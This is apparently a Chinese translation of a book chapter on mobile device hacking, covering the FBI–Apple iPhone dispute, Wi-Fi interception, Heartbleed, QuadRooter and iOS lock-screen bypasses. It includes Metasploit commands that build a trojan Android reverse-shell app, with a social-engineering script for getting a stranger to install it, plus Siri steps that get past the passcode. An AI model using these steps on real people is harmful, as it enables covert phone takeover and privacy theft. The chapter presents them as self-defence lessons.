  trans: '


    最近新闻中讨论得最广泛的手机破解事件可能是 2015 年的圣贝纳迪诺恐怖袭击及其后续调查。在这场加利福尼亚州的小镇袭击导致 16 人死亡、24 人受伤后，两名袭击者在事后丧生，调查部门开始对他们的背景进行调查。其中一名枪手
    Farook 拥有一部县政府发的 `iPhone 5C`，调查人员认为该手机可能包含有关袭击的额外证据。此外，获取该设备意味着 FBI 可以调查手机进出的任何通信内容，可能揭示任何活跃的恐怖组织或影响因素。


    然而，这台 `iPhone` 设置了密码保护，并更新了 `iOS` 的高级安全功能，这确保了政府无法访问手机内容。NSA、FBI 和其他政府小组无法破解这种保护，因此他们要求
    Apple 在 `iOS` 中提供一个后门，供 FBI 访问数据。Apple 拒绝了请求，并表示这种后门将为黑客、病毒和恶意软件提供一个无差别攻击所有 `iOS`
    设备的向量。


    FBI 与 Apple 之间的紧张局势不断升级，但 Apple 坚持立场足够长，让政府去他处寻求帮助。最终在 2016 年 3 月 28 日，这台手机被一个第三方黑客小组花费百万美元破解了。该小组如何成功破解这种“不可破解”的防御尚不为人知，但据信使用了一个零日漏洞（无人知的漏洞）来获取对
    `iOS` 的访问权限。


    整个场景表明，政府并不高于民用隐私——他们会利用手中一切资源来获取访问我们设备的权限。虽然大多数人认为出于国家安全考虑需要解锁手机，但事实仍然是，如果 Apple
    顺从政府的要求，那么像 NSA 和 FBI 这样的组织将直接连接所有 `iOS` 设备及其数据（这是对信任的明显背叛）。手机安全在未来几年将继续是一个热点，因此通过研究黑客的思维来学习如何保护自己，从远来看将让你受益。


    # 移动设备安全漏洞


    手机和笔记本电脑等移动设备特别受到常见 IT 问题的影响。然而，这些方便设备的便携性放大了攻击向量的多样性。Wi-Fi 热点通常存在于咖啡馆、公共餐厅和图书馆。免费且开放的
    Wi-Fi 总是很有帮助，但它们会让移动设备暴露于数据拦截和“中间人”攻击之中。


    例如，假设一个黑客创建了一个公共 Wi-Fi 点。通过将其命名为“星巴克免费 Wi-Fi”等不不起眼的名称，人们一定会用手机和笔记本电脑连接。此时，黑客已经安装了
    `Kali Linux`（更多信息请参阅“新生版”）并连接到了受侵害的互联网。他们运行数据包捕获程序，在受害者毫无察觉的情况下实时窃取在线银行信息。具有安全意识的人应该始终记住，开放的
    Wi-Fi 热点是危险的，应该只在进行简单浏览或运行 VPN 时才连接。


    社交工程学在手机破解中也扮演着很大作用。手机用户通常忘记手机也会像 PC 一样感染病毒和恶意软件，因此用户在手机上浏览时往往掉以防备，并意点击链接和下载木马。下面的演示（感谢
    `http://wonderhowto.com`）利用了同一网络上的 `Android` 设备（我们在星巴克），并将控制权交给了黑客。


    1. 启动一台安装了 `Kali Linux` 和 `metasploit` 应用程序笔记本电脑。

    2. 在终端中使用 `ifconfig` 找到你的 IP 地址。

    3. 输入此命令- `msfpayload android/meterpreter/reverse_tcp LHOST=(your IP) LPORT=8080
    R > ~/Desktop/starbucksgames.apk`，这将在桌面上创建一个包含利用程序的应用程序。

    4. 输入 `msfconsole` 启动 metasploit 控制台。

    5. 在新控制台中，输入 `use exploit/multi/handler`。

    6. 然后输入 `set payload android/meterpreter/reverse_tcp`。

    7. `set lhost (Your IP)`。

    8. `set lport 8080`。

    9. 现在你需要将利用程序交付给受害者。你可以走过去问他们：“嘿，你试过星巴克的 Android 免费游戏应用吗？挺好玩的”。在他们许可的情况下，你可以通过邮件将应用程序发送给他们。当他们在手机上下载并启动它时，回到你的笔记本电脑并在
    metasploit 控制台中输入 `exploit`。两个设备将进行通信，你将获得手机部分的控制权。


    学到的教训是，永远不要安装任何看起来奇怪或来自不可靠来源的程序。在书的后面，特别是谈到越狱和 Root 设备时，我们将安装许多“未经验证”的应用程序。最终，没有真实的方法可以知道我们安装的是正版应用还是像那样的木马。对于非官方应用程序，你必须相信自己的安全直觉，仅从可靠的来源安装。


    ## Heartbleed

    `Heartbleed` 是 2014 年著名的 `OpenSSL` 漏洞，影响了 50 万台 Web 服务器，还影响了近 500 万台 `Android`
    设备。该漏洞允许黑客通过溢出 `TLS` 加密缓冲区读取存储在内存中的数据，如密码、加密密钥和用户名。其影响如此巨大，遍的设备都需要紧急补丁来保护自己。`OpenSSL`
    尽快解决了该漏洞，Android 厂商也发布了修复该问题的更新。


    ## QuadRooter

    `QuadRooter` 是 Android 设备 芯片组中发现的一种新型漏洞。通过伪装的恶意应用程序，黑客可以在无需请求的情况下获得所有设备权限。目前估计有
    9 亿台 `Android` 设备存在漏洞，且在写作时，并非所有运营商都发布了补丁来解决此问题。防止 `QuadRooter` 攻击的方法是在补丁发布后立即更新，并避免安装可疑应用程序。


    ## iOS 漏洞

    不仅是 Android 受到黑客的影响，运行低于 9.3.1 版本的 `iPhone 6` 和 `6S` 即使开启了密码或指纹，其照片也可能被翻看。以下是过程。跟着查看你的手机是否存在漏洞。


    1. 按住 Home 键启动 `Siri`。

    2. 说“Search twitter”。

    3. `Siri` 会询问搜索什么，回答“@yahoo.com”、“@att.net”、“@gmail.com”或任何其他邮箱后缀。

    4. `Siri` 将显示相关结果，因此从中找到一个完整的邮箱地址。用力按住地址（3D Touch），然后点击“添加新联系人”。

    5. 此时，通过向我们的新“联系人”“添加照片”，我们就可以访问整个照片库。


    这让人想起早前的一个 `iOS9` 漏洞，可以在没有密码的情况下完全解锁手机。你可以在未更新的 `iOS9` 上进行这种破解。


    1. 按住 Home 键启动 `Siri`。

    2. 说“remind me”。

    3. 说任何内容。

    4. 点击 `Siri` 创建的提醒事项。

    5. 启动提醒事项，长按你刚刚创建的那个，并点击“分享”。

    6. 点击信息应用。

    7. 输入任何名称，然后点击该名称创建一个新联系人。

    8. 点击“选择照片”，然后你可以在解锁锁屏状态下按 Home 键回到主屏幕。


    上述提到的两个大多数漏洞在被发现后几乎就会被修补，这就是为什么它们在已更新的 `iOS9` 上无效。


    最后，如果黑客拥有手机的实体，他们还有最后一个战术可以用来入侵手机。如果黑客真的想要获取移动设备的访问，他们可以以删除所有数据的代价来实现。通过出厂重置，黑客将擦除设备上的所有内容，包括密码和加密，但他们将可以使用该设备或将其卖给别人。


